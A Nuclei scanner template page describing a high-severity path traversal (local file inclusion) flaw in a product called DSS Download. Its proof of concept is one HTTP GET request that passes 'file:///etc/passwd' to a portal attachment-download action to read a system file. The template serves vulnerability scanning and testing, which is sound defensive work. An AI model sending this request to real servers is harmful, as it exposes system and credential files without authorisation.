# Nuclei Template: DSS Download - Local File Inclusion
**Template ID:** dss-download-fileread
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`dss-download-fileread.yaml`)

## Vulnerability Information & PoC

## Description
DSS Download is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
```

